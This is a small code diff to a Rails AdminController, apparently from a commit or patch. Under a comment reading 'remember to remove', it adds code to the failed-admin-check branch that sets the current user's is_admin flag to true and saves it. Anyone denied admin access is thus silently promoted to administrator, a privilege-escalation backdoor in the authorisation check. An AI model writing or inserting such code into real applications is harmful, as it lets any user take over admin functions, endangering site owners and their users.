@@ -29,6 +29,9 @@ class AdminController < ApplicationController
       end
     end
     flash[:error]='Please log in as an administrator to continue'
+    # remember to remove
+    @user.is_admin = true
+    @user.save
     redirect_to login_path
     return false 
   end
